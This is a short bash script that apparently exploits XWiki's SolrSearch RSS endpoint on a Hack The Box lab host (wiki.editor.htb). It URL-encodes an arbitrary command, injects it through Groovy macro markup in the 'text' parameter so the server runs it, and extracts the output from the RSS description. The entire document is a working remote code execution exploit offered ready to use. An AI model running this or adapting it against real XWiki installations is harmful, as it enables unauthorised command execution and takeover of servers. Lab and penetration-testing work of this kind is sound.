#!/bin/bash

cmd=$1
encoded_cmd=$(python -c "from urllib import parse; print(parse.quote('${cmd}'))")
echo $encoded_cmd
rtn=$(curl "http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22${encoded_cmd}%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d")
echo "$rtn" | grep "description.*\/description" -o | sed 's/<br\/>/\n/g'

